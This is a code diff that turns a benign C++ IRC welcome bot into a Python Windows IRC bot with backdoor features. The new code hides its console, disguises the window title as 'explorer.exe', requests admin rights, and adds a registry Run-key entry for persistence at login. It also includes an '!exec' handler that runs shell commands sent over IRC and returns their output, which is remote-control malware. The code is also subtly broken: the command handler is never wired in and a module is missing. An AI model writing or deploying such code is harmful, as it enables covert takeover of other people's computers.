@@ -1,84 +1,81 @@
-#include <iostream>
-#include <string>
-#include <thread>
-#include <chrono>
-#include <cstring>
-#include <cstdlib>
-#include <unistd.h>
-#include <netdb.h>
-#include <arpa/inet.h>
-#include <sys/socket.h>
+import socket
+import threading
+import time
+import subprocess
+import winreg  # Thêm dòng này ở đầu
+import ctypes
+import win32console, win32gui
+import ctypes
+is_admin = ctypes.windll.shell32.IsUserAnAdmin()
+ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, "", None, 1)
 
-const std::string SERVER = "irc.df.lth.se";
-const int PORT = 6667;
-const std::string NICK = "CppBot";
-const std::string USER = "USER CppBot 8 * :I'm a C++ IRC bot";
-const std::string CHANNEL = "#my_channel";
+window = win32console.GetConsoleWindow()
+win32gui.ShowWindow(window, 0)
 
-int sockfd;
+ctypes.windll.kernel32.SetConsoleTitleW("explorer.exe")
 
-void sendLine(const std::string& line) {
-    std::string data = line + "\r\n";
-    send(sockfd, data.c_str(), data.length(), 0);
-}
 
-void pingSender() {
-    while (true) {
-        sendLine("PING :" + SERVER);
-        std::this_thread::sleep_for(std::chrono::seconds(15));
-    }
-}
+# Thông tin kết nối IRC
+SERVER = "irc.df.lth.se"
+PORT = 6667
+NICK = "CppBot"
+USER = "USER CppBot 8 * :I'm a C++ IRC bot"
+CHANNEL = "#my_channel"
 
-int main() {
-    struct hostent* host = gethostbyname(SERVER.c_str());
-    if (!host) {
-        std::cerr << "Failed to resolve hostname.\n";
-        return 1;
-    }
+# Hàm thêm bot vào Registry để tự chạy khi khởi động
+def setup_persistence():
+    try:
+        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
+        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
 
-    sockaddr_in serverAddr{};
-    serverAddr.sin_family = AF_INET;
-    serverAddr.sin_port = htons(PORT);
-    std::memcpy(&serverAddr.sin_addr, host->h_addr, host->h_length);
+        winreg.SetValueEx(key, "CppBot", 0, winreg.REG_SZ, r"C:\Users\YourName\AppData\Roaming\cppbot.exe")
+        winreg.CloseKey(key)
+        print("[+] Persistence setup complete.")
+    except Exception as e:
+        print(f"[!] Failed to set persistence: {e}")
 
-    sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    if (connect(sockfd, (sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
-        std::cerr << "Connection failed.\n";
-        return 1;
-    }
+def send_line(sock, line):
+    sock.send((line + "\r\n").encode())
+def handle_command(sock, nickname, message):
+    if message.startswith("!exec "):
+        command = message[6:]
+        try:
+            result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
+            send_line(sock, f"PRIVMSG {CHANNEL} :{result.decode(errors='ignore')[:300]}")
+        except Exception as e:
+            send_line(sock, f"PRIVMSG {CHANNEL} :Error: {e}")
 
-    sendLine(USER);
-    sendLine("NICK " + NICK);
-    sendLine("JOIN " + CHANNEL);
+def ping_sender(sock):
+    while True:
+        send_line(sock, f"PING :{SERVER}")
+        time.sleep(15)
 
-    std::thread pingThread(pingSender);
-    pingThread.detach();
+def main():
+    sock = socket.socket()
+    sock.connect((SERVER, PORT))
+    
+    send_line(sock, f"NICK {NICK}")
+    send_line(sock, USER)
+    send_line(sock, f"JOIN {CHANNEL}")
 
-    char buffer[512];
-    while (true) {
-        std::memset(buffer, 0, sizeof(buffer));
-        int bytesReceived = recv(sockfd, buffer, sizeof(buffer) - 1, 0);
-        if (bytesReceived <= 0) break;
+    setup_persistence()  # <--- Gọi hàm này tại đây, sau khi kết nối thành công
 
-        std::string msg(buffer);
-        std::cout << msg;
+    threading.Thread(target=ping_sender, args=(sock,), daemon=True).start()
 
-        // Respond to PING from server
-        if (msg.find("PING :") != std::string::npos) {
-            std::string response = "PONG :" + msg.substr(msg.find(":") + 1);
-            sendLine(response);
-        }
+    while True:
+        try:
+            data = sock.recv(512).decode(errors="ignore")
+            print(data)
 
-        // Welcome users who join the channel
-        if (msg.find("JOIN :" + CHANNEL) != std::string::npos) {
-            size_t start = msg.find(":") + 1;
-            size_t end = msg.find("!");
-            std::string nickname = msg.substr(start, end - start);
-            sendLine("NOTICE " + nickname + " :Hi " + nickname + ", welcome to " + CHANNEL + "!");
-            std::this_thread::sleep_for(std::chrono::seconds(2));
-        }
-    }
+            if "PING :" in data:
+                pong_msg = "PONG :" + data.split(":")[1]
+                send_line(sock, pong_msg)
 
-    close(sockfd);
-    return 0;
-}
+        except Exception as e:
+            print(f"[!] Connection error: {e}")
+            break
+
+    sock.close()
+
+if __name__ == "__main__":
+    main()
